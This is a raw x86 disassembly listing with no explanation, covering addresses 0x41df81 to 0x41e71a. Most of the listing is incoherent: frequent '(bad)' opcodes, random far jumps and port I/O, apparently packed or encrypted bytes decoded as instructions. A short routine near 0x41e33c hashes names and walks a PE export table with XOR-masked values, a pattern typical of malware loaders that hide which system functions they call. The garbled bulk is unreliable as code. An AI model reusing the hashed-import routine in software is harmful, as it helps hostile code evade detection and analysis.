  41df81:	jg     0x41df58
  41df83:	add    al,0x81
  41df85:	mov    edx,0x7541c92a
  41df8a:	sub    al,0xe1
  41df8c:	jecxz  0x41df65
  41df8e:	add    DWORD PTR [edx],edi
  41df90:	mov    cl,0x92
  41df92:	(bad)  
  41df93:	mov    dl,0xe3
  41df95:	lods   al,BYTE PTR ds:[esi]
  41df96:	xchg   ecx,eax
  41df97:	aam    0x9e
  41df99:	adc    al,0xff
  41df9b:	mov    ebx,0x114cee43
  41dfa0:	jb     0x41df8c
  41dfa2:	aad    0x80
  41dfa4:	push   esi
  41dfa5:	xor    ch,bl
  41dfa7:	lahf   
  41dfa8:	retf   
  41dfa9:	mov    al,0xad
  41dfab:	adc    eax,0x9773386f
  41dfb0:	add    cl,BYTE PTR [ecx-0x67]
  41dfb3:	inc    edx
  41dfb4:	jmp    0x41e019
  41dfb6:	mov    ds:0x9352bcb3,al
  41dfbb:	(bad)
  41dfbe:	mov    ecx,0xbc6cea8e
  41dfc3:	lea    ebp,[esi-0x3f]
  41dfc6:	test   WORD PTR [eax],dx
  41dfc9:	sar    edx,cl
  41dfcb:	jle    0x41df76
  41dfcd:	mov    dl,0xe6
  41dfcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfd0:	hlt    
  41dfd1:	test   DWORD PTR [eax],eax
  41dfd3:	ret    
  41dfd4:	fwait
  41dfd5:	nop
  41dfd6:	stos   DWORD PTR es:[di],eax
  41dfd8:	sbb    ebp,DWORD PTR [ebp+0x62]
  41dfdb:	push   0x17
  41dfdd:	lods   eax,DWORD PTR ds:[esi]
  41dfde:	std    
  41dfdf:	in     al,dx
  41dfe0:	ss call 0x5af696e
  41dfe6:	inc    esi
  41dfe7:	lds    edi,FWORD PTR ds:0xb89342
  41dfed:	mov    ds:0xcb8789ee,al
  41dff2:	nop
  41dff3:	dec    eax
  41dff4:	call   0xf9fbde44
  41dff9:	jmp    0x41dfb9
  41dffb:	scas   eax,DWORD PTR es:[edi]
  41dffc:	inc    ebp
  41dffd:	mov    al,BYTE PTR [esi-0x1]
  41e000:	arpl   WORD PTR [edi+0x7d],ax
  41e003:	ror    ecx,cl
  41e005:	sti    
  41e006:	mov    ebx,0xa6eecbb7
  41e00b:	pavgb  mm6,QWORD PTR [ebp+0x47]
  41e00f:	push   ecx
  41e010:	mov    esi,0xaa07d2d4
  41e015:	jl     0x41dfdd
  41e017:	rcr    cl,0x76
  41e01a:	sub    al,0xfe
  41e01c:	repz mov bl,0x42
  41e01f:	inc    edi
  41e020:	jge    0x41dfe1
  41e022:	cs push ds
  41e024:	fstp   TBYTE PTR [ecx+0x62]
  41e027:	in     eax,0x1e
  41e029:	adc    DWORD PTR [esp+ecx*1],esp
  41e02c:	sub    BYTE PTR [ebp+0x59c9f7cc],dl
  41e032:	sbb    eax,0x71eaf3cc
  41e037:	sbb    DWORD PTR [edi],esp
  41e039:	mov    al,0xad
  41e03b:	mov    bl,BYTE PTR [ebx+0x22]
  41e03e:	cmp    ch,BYTE PTR [edi]
  41e040:	je     0x41dfdc
  41e042:	in     al,0x58
  41e044:	adc    BYTE PTR [edi-0x11],al
  41e047:	pusha  
  41e048:	bound  esi,QWORD PTR [ebp-0x5ffe078c]
  41e04e:	idiv   DWORD PTR [esi]
  41e050:	pop    edi
  41e051:	sbb    BYTE PTR [eax+0x38bdc8e3],0xec
  41e058:	js     0x41e045
  41e05a:	in     eax,0x81
  41e05c:	cmc    
  41e05d:	addr16 push ds
  41e05f:	add    BYTE PTR [esi-0x74],al
  41e062:	and    bl,cl
  41e064:	inc    esi
  41e065:	sub    cl,BYTE PTR [edx+0x12]
  41e068:	dec    ebx
  41e069:	xchg   esi,eax
  41e06a:	xor    al,0x71
  41e06c:	call   0xc2ff4f1f
  41e071:	jno    0x41e0ea
  41e073:	cmp    eax,edi
  41e075:	push   edx
  41e076:	adc    al,0x36
  41e078:	mov    esi,0x3c0bc80c
  41e07d:	inc    edx
  41e07e:	ja     0xd5e85228
  41e084:	push   0x6dd7163b
  41e089:	sub    DWORD PTR [edx+0x34],0x6c
  41e08d:	test   al,0xcd
  41e08f:	sub    ecx,DWORD PTR [eax]
  41e091:	jge    0x41e03b
  41e093:	inc    esp
  41e094:	sar    DWORD PTR [esi],cl
  41e096:	out    dx,al
  41e097:	xchg   ebx,eax
  41e098:	push   ss
  41e099:	hlt    
  41e09a:	in     eax,dx
  41e09b:	sbb    bh,bh
  41e09d:	mov    edi,ss
  41e09f:	cmp    bl,BYTE PTR [ebp+0x8]
  41e0a2:	push   ebx
  41e0a3:	mov    BYTE PTR [eax],0x96
  41e0a6:	stc    
  41e0a7:	jmp    0x41e103
  41e0a9:	popf   
  41e0aa:	ss into 
  41e0ac:	imul   eax,DWORD PTR [ebx+0x741fb2c3],0x6768251b
  41e0b6:	mov    ebx,DWORD PTR [edi]
  41e0b8:	loopne 0x41e12f
  41e0ba:	inc    ebp
  41e0bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0bc:	jecxz  0x41e0e6
  41e0be:	fnstenv [eax-0x285f102a]
  41e0c4:	xor    dl,BYTE PTR [edx-0x7b]
  41e0c7:	and    DWORD PTR [eax+0x77e8955b],edi
  41e0cd:	fcomp  DWORD PTR [ebx+0xd498b62]
  41e0d3:	leave  
  41e0d4:	mov    eax,0x15f7b3f6
  41e0d9:	and    BYTE PTR [edx-0x48],ah
  41e0dc:	add    al,0xce
  41e0de:	imul   eax,DWORD PTR [eax+0x67],0xf688490a
  41e0e5:	mov    eax,ds:0x13967308
  41e0ea:	adc    eax,0x3eacb3e5
  41e0ef:	inc    ebx
  41e0f0:	mov    WORD PTR ds:0xfba1ba66,fs
  41e0f6:	lods   eax,DWORD PTR ds:[esi]
  41e0f7:	mov    ecx,0x714bad74
  41e0fc:	iret   
  41e0fd:	cmp    BYTE PTR [edx-0x53ff233a],al
  41e103:	push   es
  41e104:	std    
  41e105:	ret    0xecae
  41e108:	xchg   esp,eax
  41e109:	mov    ebp,0x8fac3ea2
  41e10e:	adc    edi,DWORD PTR [ebp-0x3c02a7b6]
  41e114:	jae    0x41e0b2
  41e116:	nop
  41e117:	(bad)  
  41e119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e11a:	jo     0x41e122
  41e11c:	xchg   edi,eax
  41e11d:	push   esp
  41e11e:	(bad)  
  41e11f:	clc    
  41e120:	cdq    
  41e121:	in     al,dx
  41e122:	add    esi,DWORD PTR [esi+0x65]
  41e125:	shl    BYTE PTR [edi-0x57],cl
  41e128:	mov    cl,0x87
  41e12a:	aam    0x87
  41e12c:	cli    
  41e12d:	pop    esi
  41e12e:	xor    al,0x18
  41e130:	pop    esi
  41e131:	adc    esp,esi
  41e133:	aas    
  41e134:	sub    BYTE PTR [ebx-0x8],0xdb
  41e138:	jmp    0x922b:0x1f046313
  41e13f:	pusha  
  41e140:	ja     0x41e0ee
  41e142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e143:	mov    bh,0x2c
  41e145:	jl     0x41e0e2
  41e147:	out    0xc6,al
  41e149:	loope  0x41e160
  41e14b:	pop    eax
  41e14c:	push   esi
  41e14d:	inc    esp
  41e14e:	call   0xa4f3:0xfa829aaa
  41e155:	outs   dx,BYTE PTR ds:[esi]
  41e156:	cmp    eax,0x650d9f
  41e15b:	dec    BYTE PTR [ecx+0x1c096cf5]
  41e161:	dec    ebp
  41e162:	add    DWORD PTR [ebp-0x60],ebp
  41e165:	and    DWORD PTR [ebp-0x28],ecx
  41e168:	in     eax,dx
  41e169:	sbb    eax,0x3d2386bb
  41e16e:	sub    eax,0x4adb71e
  41e173:	pusha  
  41e174:	sbb    bl,bh
  41e176:	adc    eax,0xf677f606
  41e17b:	daa    
  41e17c:	xchg   BYTE PTR [ebx],dh
  41e17e:	into   
  41e17f:	sti    
  41e180:	cmp    dh,BYTE PTR [ecx]
  41e182:	ror    dl,cl
  41e184:	aas    
  41e185:	inc    ebx
  41e186:	xor    bl,BYTE PTR [ebp+0xb]
  41e189:	cmc    
  41e18a:	push   esi
  41e18b:	jno    0x41e1f3
  41e18d:	pop    edx
  41e18e:	cmp    ebx,DWORD PTR [edi-0x3021c276]
  41e194:	sbb    BYTE PTR [ebx+esi*4],0x56
  41e198:	xchg   edi,eax
  41e199:	xor    al,bh
  41e19b:	mov    ds,WORD PTR [edx]
  41e19d:	(bad)  
  41e19e:	test   eax,0x60b9c253
  41e1a3:	mov    WORD PTR [esi-0x3e],cs
  41e1a6:	fwait
  41e1a7:	loop   0x41e203
  41e1a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1aa:	bound  ebx,QWORD PTR [edx]
  41e1ac:	jle    0x41e180
  41e1ae:	test   BYTE PTR [esi-0xf],0x1f
  41e1b2:	sbb    al,0x74
  41e1b4:	stos   BYTE PTR es:[edi],al
  41e1b5:	mov    esp,0x676eb030
  41e1ba:	std    
  41e1bb:	mov    eax,?
  41e1bd:	ins    BYTE PTR es:[edi],dx
  41e1be:	jecxz  0x41e1e4
  41e1c0:	adc    DWORD PTR [edx],edx
  41e1c2:	xor    al,0x6c
  41e1c4:	fimul  WORD PTR [eax-0x7b]
  41e1c7:	sbb    BYTE PTR [eax+ebp*2+0x66684d46],dh
  41e1ce:	cmp    DWORD PTR [edi-0x5f44b5f3],edi
  41e1d4:	cmp    esi,DWORD PTR [edx+0xd]
  41e1d7:	ret    
  41e1d8:	imul   ebp,esi,0x2e273914
  41e1de:	mov    ebp,0xe496cc56
  41e1e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1e4:	or     al,0x8a
  41e1e6:	push   ebx
  41e1e7:	sar    BYTE PTR [ebx],1
  41e1e9:	addr16 aaa 
  41e1eb:	mov    ds:0x46df8d1,eax
  41e1f0:	mov    ah,0x9b
  41e1f2:	inc    eax
  41e1f3:	pop    ds
  41e1f4:	jmp    0xf4e28cb6
  41e1f9:	sahf   
  41e1fa:	add    DWORD PTR [edx+0x34],esi
  41e1fd:	mov    edx,0x1ff9fcea
  41e202:	pop    ebp
  41e203:	or     edi,DWORD PTR [esi-0x63]
  41e206:	fs jns 0x41e212
  41e209:	arpl   WORD PTR [edi+0x56],di
  41e20c:	mov    eax,0xcb49c9aa
  41e211:	sbb    DWORD PTR [edx],edx
  41e213:	jecxz  0x41e220
  41e215:	sti    
  41e216:	or     bl,0xbf
  41e219:	mov    ah,0x32
  41e21b:	cmovbe ecx,DWORD PTR [esp+edx*8+0x1]
  41e220:	ja     0x41e238
  41e222:	mov    dl,0xed
  41e224:	jge    0x41e1e1
  41e226:	mov    cs,ecx
  41e228:	ret    0x41be
  41e22b:	ret    
  41e22c:	mov    al,0xb
  41e22e:	push   edi
  41e22f:	int3   
  41e230:	add    ebx,eax
  41e232:	or     al,0x6a
  41e234:	jns    0x41e24d
  41e236:	cmp    DWORD PTR [esi-0x9],ecx
  41e239:	xchg   BYTE PTR [eax],dh
  41e23b:	aad    0x35
  41e23d:	mov    ebp,0x9cc9e7a
  41e242:	inc    esi
  41e243:	cmp    ah,0x6e
  41e246:	mov    bl,0x82
  41e248:	bsr    edi,DWORD PTR [ecx+eiz*8+0x32]
  41e24d:	push   ss
  41e24e:	retf   
  41e24f:	lds    ebx,FWORD PTR [eax+0x51ee7d9d]
  41e255:	xor    BYTE PTR [ebx+eiz*2],cl
  41e258:	pop    ecx
  41e259:	jp     0x41e280
  41e25b:	cmp    al,0xf9
  41e25d:	inc    eax
  41e25e:	mov    eax,ds:0x6cf6e690
  41e263:	cmp    eax,DWORD PTR [ecx+0x25bc115]
  41e269:	in     al,dx
  41e26a:	hlt    
  41e26b:	sub    dl,BYTE PTR [ecx+eax*1]
  41e26e:	jmp    0xeecbccfc
  41e273:	jmp    0xca11:0x632c1c15
  41e27a:	sub    esp,ebp
  41e27c:	gs adc al,0x54
  41e27f:	cmp    BYTE PTR [eax],bl
  41e281:	in     al,dx
  41e282:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e283:	and    ch,cl
  41e285:	dec    edi
  41e286:	rol    BYTE PTR ds:0x8cd5e9e,1
  41e28c:	jle    0x41e278
  41e28e:	mov    al,ds:0x774925f9
  41e293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e294:	jns    0x41e302
  41e296:	push   DWORD PTR [esi+0x64]
  41e299:	dec    ebp
  41e29a:	fisttp DWORD PTR [ebp+0x2ab47edb]
  41e2a0:	fstp   QWORD PTR [edx-0x381c3a1c]
  41e2a6:	sub    dh,BYTE PTR es:[edi]
  41e2a9:	int    0xf9
  41e2ab:	pop    esp
  41e2ac:	bound  eax,QWORD PTR [edx+0x50]
  41e2af:	div    dl
  41e2b1:	mov    edx,0x23f82eb8
  41e2b6:	ss push cs
  41e2b8:	pop    DWORD PTR [ebx+0x71]
  41e2bb:	int3   
  41e2bc:	test   al,0xa
  41e2be:	and    eax,0x41b5467e
  41e2c3:	(bad)  
  41e2c4:	push   0x7551dc3
  41e2c9:	jecxz  0x41e291
  41e2cb:	or     al,BYTE PTR [esi-0x5a7348fb]
  41e2d1:	sub    eax,0x7a1a653a
  41e2d6:	lods   eax,DWORD PTR ds:[esi]
  41e2d7:	mov    cl,0xe8
  41e2d9:	mov    BYTE PTR [ebx],cl
  41e2db:	mov    al,0xe6
  41e2dd:	(bad)  
  41e2de:	lock push edx
  41e2e0:	stos   DWORD PTR es:[edi],eax
  41e2e1:	push   ds
  41e2e2:	mov    DWORD PTR [ebx],0x3407dcdb
  41e2e8:	and    edi,ebx
  41e2ea:	sub    al,0x3c
  41e2ec:	jae    0x41e32d
  41e2ee:	pop    esp
  41e2ef:	out    0x0,eax
  41e2f1:	not    DWORD PTR [ebp+edi*2-0xd]
  41e2f5:	or     BYTE PTR [edi],bl
  41e2f7:	outs   dx,DWORD PTR ds:[esi]
  41e2f8:	cpuid  
  41e2fa:	pop    es
  41e2fb:	and    edi,ebp
  41e2fd:	imul   esp,DWORD PTR [edi-0x55],0x23e22064
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	mov    BYTE PTR [ebx+0x6a],ch
  41e308:	adc    bl,al
  41e30a:	fcmovne st,st(3)
  41e30c:	popf   
  41e30d:	jecxz  0x41e303
  41e30f:	mov    esp,0x865c41f3
  41e314:	in     eax,0x42
  41e316:	xchg   esp,eax
  41e317:	cmp    BYTE PTR [eax],al
  41e319:	js     0x41e2f4
  41e31b:	sbb    DWORD PTR ds:0x592784bd,0xffffffec
  41e322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e323:	ins    DWORD PTR es:[edi],dx
  41e324:	or     DWORD PTR [ecx+0x4],0x33
  41e328:	mov    DWORD PTR [ebx+0xf3d00f2],0xf70941e
  41e332:	test   DWORD PTR [esi],ebp
  41e334:	add    BYTE PTR [eax],al
  41e336:	add    BYTE PTR [ebx-0x7af00006],al
  41e33c:	and    eax,0x8b000000
  41e341:	inc    ebp
  41e342:	cld    
  41e343:	movsx  eax,BYTE PTR [eax]
  41e346:	cdq    
  41e347:	add    eax,ebx
  41e349:	adc    edx,0xffffffff
  41e34c:	xor    eax,edi
  41e34e:	xor    edx,0x0
  41e351:	cmp    eax,0x70941e1c
  41e356:	jne    0x41e365
  41e35c:	cmp    edx,0xffffffff
  41e35f:	je     0x41e37c
  41e365:	mov    eax,DWORD PTR [ebp-0x10]
  41e368:	xor    eax,ecx
  41e36a:	mov    edx,0xffcd8d0d
  41e36f:	sub    edx,eax
  41e371:	add    DWORD PTR [ebp-0x4],edx
  41e374:	mov    eax,DWORD PTR [ebp-0x4]
  41e377:	jmp    0x41bf5a
  41e37c:	mov    eax,DWORD PTR [ebp-0x14]
  41e37f:	mov    eax,DWORD PTR [eax]
  41e381:	mov    edx,DWORD PTR [ebp-0x4]
  41e384:	mov    edx,DWORD PTR [edx+0x3c]
  41e387:	lea    eax,[edx+eax*8+0x78]
  41e38b:	mov    edx,DWORD PTR [ebp-0x4]
  41e38e:	mov    eax,DWORD PTR [eax+edx*1]
  41e391:	mov    DWORD PTR [ebp-0x8],eax
  41e394:	mov    eax,DWORD PTR [ebp+0x8]
  41e397:	xor    eax,ecx
  41e399:	add    eax,esi
  41e39b:	mov    DWORD PTR [ebp-0x14],eax
  41e39e:	mov    eax,DWORD PTR [ebp+0x8]
  41e3a1:	mov    edx,DWORD PTR [ebp-0x8]
  41e3a4:	xor    eax,ecx
  41e3a6:	add    eax,esi
  41e3a8:	cmp    edx,eax
  41e3aa:	jne    0x41e3c8
  41e3b0:	mov    eax,DWORD PTR [ebp+0xc]
  41e3b3:	xor    eax,ecx
  41e3b5:	mov    ecx,DWORD PTR [ebp-0x8]
  41e3b8:	add    eax,esi
  41e3ba:	imul   eax,ecx
  41e3bd:	mov    DWORD PTR [ebp-0x8],eax
  41e3c0:	push   DWORD PTR [ebp+0x18]
  41e3c3:	jmp    0x4207e6
  41e3c8:	mov    eax,DWORD PTR [ebp-0x8]
  41e3cb:	mov    ecx,DWORD PTR [ebp-0x4]
  41e3ce:	jmp    0x420791
  41e3d3:	test   BYTE PTR [eax+0x3d],cl
  41e3d6:	lock mov cl,0x80
  41e3d9:	or     BYTE PTR [eax],0x6f
  41e3dc:	enter  0xd93f,0x87
  41e3e0:	(bad)  
  41e3e1:	xor    al,0x89
  41e3e3:	adc    ebp,edx
  41e3e5:	add    BYTE PTR [ebx-0x7c7ca327],0x6e
  41e3ec:	add    edx,eax
  41e3ee:	ss fsub QWORD PTR ss:[edx+0x5eb7da9f]
  41e3f6:	out    dx,al
  41e3f7:	rcr    DWORD PTR [edi],cl
  41e3f9:	(bad)  
  41e3fa:	mov    ds:0xef763aa,al
  41e3ff:	int3   
  41e400:	inc    ebx
  41e401:	in     al,dx
  41e402:	das    
  41e403:	sub    eax,0x6502096f
  41e408:	or     DWORD PTR [edi+0x42],0x2a
  41e40c:	xchg   esi,eax
  41e40d:	push   0xffffffc4
  41e40f:	sub    al,0xf5
  41e411:	sub    ah,BYTE PTR [esi+0x764149f4]
  41e417:	jp     0x41e402
  41e419:	(bad)  [edx]
  41e41b:	mov    DWORD PTR [ecx-0x25],0xe0cf8194
  41e422:	ds aaa 
  41e424:	mov    ch,0xe0
  41e426:	test   al,0x39
  41e428:	cld    
  41e429:	pop    ecx
  41e42a:	cmp    DWORD PTR [edx],0x70
  41e42d:	jp     0x41e3e4
  41e42f:	and    eax,0x84970469
  41e434:	clc    
  41e435:	pusha  
  41e436:	cs test al,0xb0
  41e439:	adc    DWORD PTR [ebp-0x7b],esi
  41e43c:	es loopne 0x41e430
  41e43f:	mov    esi,0x381a7978
  41e444:	mov    eax,ds:0xfe3341d8
  41e449:	mov    ds:0x79e61cc8,eax
  41e44e:	inc    eax
  41e44f:	xchg   ebp,eax
  41e450:	pop    esp
  41e451:	mov    al,0x3f
  41e453:	pop    esi
  41e454:	out    dx,al
  41e455:	loope  0x41e4d5
  41e457:	enter  0x10da,0xc1
  41e45b:	std    
  41e45c:	push   ebx
  41e45d:	mov    dh,0x96
  41e45f:	out    0xd7,al
  41e461:	into   
  41e462:	xchg   esp,eax
  41e463:	pop    ebx
  41e464:	push   eax
  41e465:	leave  
  41e466:	ins    BYTE PTR es:[edi],dx
  41e467:	mov    eax,0x497db61d
  41e46c:	pop    edi
  41e46d:	lods   al,BYTE PTR ds:[esi]
  41e46e:	mov    eax,ds:0xb74a887f
  41e473:	rdpmc  
  41e475:	xchg   esi,eax
  41e476:	hlt    
  41e477:	xchg   ebx,eax
  41e478:	dec    eax
  41e479:	mov    edi,DWORD PTR [edx+0x18]
  41e47c:	mov    cl,0xa0
  41e47e:	mov    ds:0x73514da,eax
  41e483:	test   DWORD PTR [edi+eiz*4],ebx
  41e486:	in     al,dx
  41e487:	add    edx,eax
  41e489:	add    al,0x25
  41e48b:	js     0x41e477
  41e48d:	jb     0x41e43a
  41e48f:	mov    al,ds:0xf21098e4
  41e494:	or     ebx,DWORD PTR [ebp+0x541fbd43]
  41e49a:	lods   al,BYTE PTR ds:[esi]
  41e49b:	pop    DWORD PTR [edx+ecx*2]
  41e49e:	cmp    BYTE PTR [ecx],ch
  41e4a0:	(bad)  
  41e4a1:	push   ebx
  41e4a2:	adc    BYTE PTR [ebp+0x79],0x4
  41e4a6:	sub    eax,0x472893ed
  41e4ab:	adc    eax,0x5b06fa3a
  41e4b0:	and    BYTE PTR [edi+0x68be8469],0x2c
  41e4b7:	and    ebp,DWORD PTR [esi]
  41e4b9:	loope  0x41e4e3
  41e4bb:	xor    cl,BYTE PTR [ebp+0x31]
  41e4be:	mov    esp,0x39d50a96
  41e4c3:	sub    BYTE PTR [ebx-0x1ba7fb7],bl
  41e4c9:	jno    0x41e53d
  41e4cb:	cwde   
  41e4cc:	mov    ebx,0x62802aa2
  41e4d1:	scas   eax,DWORD PTR es:[edi]
  41e4d2:	sar    BYTE PTR [esi],cl
  41e4d4:	and    DWORD PTR [edx+0x7b3e7547],edi
  41e4da:	inc    ebp
  41e4db:	stos   DWORD PTR es:[edi],eax
  41e4dc:	rcr    BYTE PTR [edi],0xe6
  41e4df:	(bad)  
  41e4e0:	(bad)  
  41e4e1:	push   ecx
  41e4e2:	repz jge 0x41e503
  41e4e5:	lods   al,BYTE PTR ds:[esi]
  41e4e6:	(bad)  
  41e4e7:	lods   al,BYTE PTR ds:[esi]
  41e4e8:	push   esp
  41e4e9:	(bad)  
  41e4ea:	fmul   QWORD PTR ds:0x5421eec
  41e4f0:	mov    bl,0x6c
  41e4f2:	add    DWORD PTR [eax+esi*2+0x23],esp
  41e4f6:	sbb    eax,0xe781d716
  41e4fb:	das    
  41e4fc:	ret    0x4b3f
  41e4ff:	xchg   esi,eax
  41e500:	push   ebx
  41e501:	imul   edx,DWORD PTR [eax-0x6c29d3d],0xb0423076
  41e50b:	fsub   st(6),st
  41e50d:	mov    ecx,0x4760be3c
  41e512:	sub    ch,dh
  41e514:	push   ecx
  41e515:	jns    0x41e571
  41e517:	xor    cl,BYTE PTR [edi-0x4486c39e]
  41e51d:	mov    edx,0xf1a3cefe
  41e522:	fidiv  WORD PTR ds:0x61924e3c
  41e528:	jle    0x41e516
  41e52a:	rcr    eax,cl
  41e52c:	jnp    0x41e4f0
  41e52e:	sub    al,0x40
  41e530:	icebp  
  41e531:	fwait
  41e532:	scas   eax,DWORD PTR es:[edi]
  41e533:	adc    al,0xbe
  41e535:	leave  
  41e536:	adc    edx,eax
  41e538:	mov    ebx,0x879403a7
  41e53d:	push   ebp
  41e53e:	ds fdivr st(2),st
  41e541:	mov    bl,0x7c
  41e543:	fisubr DWORD PTR [edi]
  41e545:	or     eax,DWORD PTR [esi]
  41e547:	mov    edx,0x8119d141
  41e54c:	mov    edi,0xa4784b5d
  41e551:	bound  ebx,QWORD PTR [edx-0x78797db6]
  41e557:	fisub  WORD PTR cs:[edi]
  41e55a:	fidiv  DWORD PTR [edi+ecx*2-0x44]
  41e55e:	into   
  41e55f:	xchg   edi,eax
  41e560:	test   DWORD PTR [esi],ebx
  41e562:	bound  esi,QWORD PTR [eax]
  41e564:	adc    eax,0x30ea28eb
  41e569:	fcomp  DWORD PTR [ebp-0x4e]
  41e56c:	mov    ecx,0x41a2c7c4
  41e571:	nop
  41e572:	sbb    BYTE PTR [ecx-0x6ba98659],cl
  41e578:	sbb    al,0xaa
  41e57a:	mov    al,ds:0xd4b8d2ac
  41e57f:	mov    ds:0x60d24e0a,al
  41e584:	add    DWORD PTR [ebp-0x8705620],esp
  41e58a:	mov    eax,ds:0x2305a5aa
  41e58f:	mov    bx,0x1e78
  41e593:	das    
  41e594:	xchg   edx,eax
  41e595:	enter  0xd801,0xd1
  41e599:	xor    eax,0xa9240bd6
  41e59e:	mov    ds:0x1aa114e,eax
  41e5a3:	or     DWORD PTR [edi-0x24170251],ecx
  41e5a9:	ins    DWORD PTR es:[edi],dx
  41e5aa:	or     bl,BYTE PTR [eax-0x1ad196c1]
  41e5b0:	out    0xe7,eax
  41e5b2:	mov    bl,cl
  41e5b4:	je     0x41e591
  41e5b6:	and    esi,eax
  41e5b8:	jne    0x41e54b
  41e5ba:	jg     0x41e5bc
  41e5bc:	into   
  41e5bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5be:	shl    BYTE PTR [edi+0x16473e24],cl
  41e5c4:	inc    eax
  41e5c5:	xlat   BYTE PTR ds:[ebx]
  41e5c6:	xor    BYTE PTR [ecx-0x51d00086],dh
  41e5cc:	jne    0x41e5a6
  41e5ce:	jns    0x41e585
  41e5d0:	dec    DWORD PTR [edi+0x0]
  41e5d3:	fs aas 
  41e5d5:	adc    al,0xe3
  41e5d7:	hlt    
  41e5d8:	lahf   
  41e5d9:	push   0x8ae6cd88
  41e5de:	ins    BYTE PTR es:[edi],dx
  41e5df:	scas   al,BYTE PTR es:[edi]
  41e5e0:	(bad)  
  41e5e2:	push   esi
  41e5e3:	pop    ds
  41e5e4:	call   0xd6786de9
  41e5e9:	in     al,0x31
  41e5eb:	dec    edx
  41e5ec:	inc    ecx
  41e5ed:	dec    edi
  41e5ee:	test   al,0x9
  41e5f0:	xlat   BYTE PTR cs:[ebx]
  41e5f2:	xadd   ecx,esp
  41e5f5:	jg     0x41e63c
  41e5f7:	test   DWORD PTR [ebp-0x29fc46c],ebp
  41e5fd:	mov    BYTE PTR [eax-0x4a],bh
  41e600:	pop    ebx
  41e601:	popa   
  41e602:	ins    DWORD PTR es:[edi],dx
  41e603:	jmp    0x4f49:0x1131cace
  41e60a:	push   ebx
  41e60b:	xor    eax,0xc50772c7
  41e610:	sub    DWORD PTR [ebp-0x76f05352],0xffffffa6
  41e617:	lds    ecx,FWORD PTR [ecx]
  41e619:	iret   
  41e61a:	push   ss
  41e61b:	mov    BYTE PTR [edi+0xc3d680f],bl
  41e621:	iret   
  41e622:	xchg   esp,eax
  41e623:	test   eax,0x690826a3
  41e628:	push   es
  41e629:	lea    ebp,[ebx]
  41e62b:	and    esp,DWORD PTR [ecx]
  41e62d:	xchg   esi,eax
  41e62e:	in     eax,0x63
  41e630:	cwde   
  41e631:	jae    0x41e62c
  41e633:	int3   
  41e634:	ret    0x7e89
  41e637:	fild   DWORD PTR [esp+edi*4-0x7]
  41e63b:	stc    
  41e63c:	scas   eax,DWORD PTR es:[edi]
  41e63d:	(bad)  [esi-0x2a]
  41e640:	push   eax
  41e641:	mov    bh,0x7d
  41e643:	cmp    eax,0x69a8e97
  41e648:	ror    DWORD PTR [ecx*2+0x68a31a67],0x53
  41e650:	adc    BYTE PTR [eax+0x5c067548],ch
  41e656:	fdiv   DWORD PTR [ebp+0x317109bf]
  41e65c:	jp     0x41e6d4
  41e65e:	shl    BYTE PTR [esi-0x5f],cl
  41e661:	mov    ebx,0x78a35cd6
  41e666:	and    ebx,edi
  41e668:	push   eax
  41e669:	cdq    
  41e66a:	jmp    0xda7e:0x4136629b
  41e671:	cld    
  41e672:	daa    
  41e673:	aaa    
  41e674:	jnp    0x41e614
  41e676:	xchg   ecx,eax
  41e677:	mov    dl,0xdd
  41e679:	sbb    edi,DWORD PTR [ecx]
  41e67b:	jbe    0x41e693
  41e67d:	sub    BYTE PTR ds:0xf93c0277,al
  41e683:	iret   
  41e684:	pop    edi
  41e685:	sub    cl,bh
  41e687:	rol    BYTE PTR [edx],1
  41e689:	mov    esp,ds
  41e68b:	fbld   TBYTE PTR [edx-0xfedf6b1]
  41e691:	push   0xffffff97
  41e693:	push   edx
  41e694:	ds add al,0xec
  41e697:	clc    
  41e698:	cmp    esp,edx
  41e69a:	(bad)  
  41e69b:	pop    edx
  41e69c:	ret    0xbdc1
  41e69f:	popf   
  41e6a0:	ins    BYTE PTR es:[edi],dx
  41e6a1:	cmc    
  41e6a2:	dec    esp
  41e6a3:	lock pop ebx
  41e6a5:	stos   DWORD PTR es:[edi],eax
  41e6a6:	outs   dx,DWORD PTR ds:[esi]
  41e6a7:	inc    esi
  41e6a8:	bound  ecx,QWORD PTR [edx-0x32]
  41e6ab:	mov    ds:0xc50a7d8,al
  41e6b0:	call   0xf6ec:0x64e39711
  41e6b7:	cmp    DWORD PTR [edx+0x7e],edi
  41e6ba:	push   eax
  41e6bb:	ins    BYTE PTR es:[edi],dx
  41e6bc:	cmp    ecx,0x26
  41e6bf:	push   esi
  41e6c0:	shl    BYTE PTR [ecx+0xa],0x7a
  41e6c4:	jno    0x41e72a
  41e6c6:	jne    0x41e64d
  41e6c8:	fnstcw WORD PTR [edi-0x725b1fa5]
  41e6ce:	dec    ebp
  41e6cf:	out    0x2d,al
  41e6d1:	xor    esi,edi
  41e6d3:	fcmovnb st,st(3)
  41e6d5:	test   al,0xc0
  41e6d7:	mov    DWORD PTR [edi],esp
  41e6d9:	push   esi
  41e6da:	loop   0x41e666
  41e6dc:	xchg   ecx,eax
  41e6dd:	inc    BYTE PTR [edx+0x31f29ecb]
  41e6e3:	shl    DWORD PTR [ebp-0x26e5fb5f],1
  41e6e9:	cmp    dx,WORD PTR [edi+0x1d906f19]
  41e6f0:	sbb    eax,0x19311a9f
  41e6f5:	mov    ?,WORD PTR [ebx+eax*4+0x1b]
  41e6f9:	xor    BYTE PTR [edi],ah
  41e6fb:	sbb    al,0xd9
  41e6fd:	push   ss
  41e6fe:	scas   eax,DWORD PTR es:[edi]
  41e6ff:	inc    edx
  41e700:	jmp    0x16e3:0x632fcf46
  41e707:	aad    0x18
  41e709:	nop
  41e70a:	push   cs
  41e70b:	push   ecx
  41e70c:	xchg   esp,eax
  41e70d:	gs push esi
  41e70f:	mov    dh,0x64
  41e711:	mov    BYTE PTR [edx+edi*8],bl
  41e714:	pop    ebx
  41e715:	and    eax,0x88f86a
  41e71a:	cmp    ch,BYTE PTR [edi+0x46]
